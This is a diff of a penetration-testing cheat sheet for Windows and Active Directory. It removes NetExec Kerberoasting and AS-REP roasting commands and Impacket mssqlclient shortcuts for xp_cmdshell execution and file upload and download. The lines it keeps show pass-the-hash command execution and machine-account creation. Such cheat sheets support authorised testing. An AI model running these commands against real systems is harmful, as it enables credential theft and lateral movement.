@@ -49,12 +49,6 @@ General tips:
   `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> -Q "EXEC xp_cmdshell 'whoami'"`  
   (requires xp_cmdshell already enabled)
 
-### LDAP / Kerberos Modules
-- AS-REP roast via LDAP against the KDC:  
-  `nxc ldap <kdc_host> -u <user> -p <password> --asreproast output.txt --kdcHost <domain_fqdn>`
-- Kerberoast service accounts through LDAP:  
-  `nxc ldap <kdc_host> -u <user> -p <password> --kerberoast output.txt --kdcHost <domain_fqdn>`
-
 ---
 
 ## Impacket Lateral Movement Toolkit
@@ -94,12 +88,6 @@ All Impacket examples accept `-hashes <LMHASH:NTHASH>` for pass-the-hash; use `-
   `lookupsid.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
 - Add new machine account using credentials/hashes:  
   `addcomputer.py <domain>/<user>@<dc_ip> -hashes <LMHASH:NTHASH> -computer-name <NEWCOMPUTER$> -computer-pass <Password>`
-- Impacket `mssqlclient.py` upload/download shortcuts (within SQL> prompt):  
-  - `SQL> enable_xp_cmdshell` – Turn on xp_cmdshell.  
-  - `SQL> xp_cmdshell whoami` – Run OS command.  
-  - `SQL> upload /path/to/local.bin C:\Windows\Temp\local.bin` – Push file to target.  
-  - `SQL> download C:\Windows\Temp\loot.txt ./loot.txt` – Pull file from target.  
-  - `SQL> disable_xp_cmdshell` – Restore default setting when finished.
 
 ### Kerberos & Ticket Operations
 - Use pass-the-hash with Kerberos (no password required):  
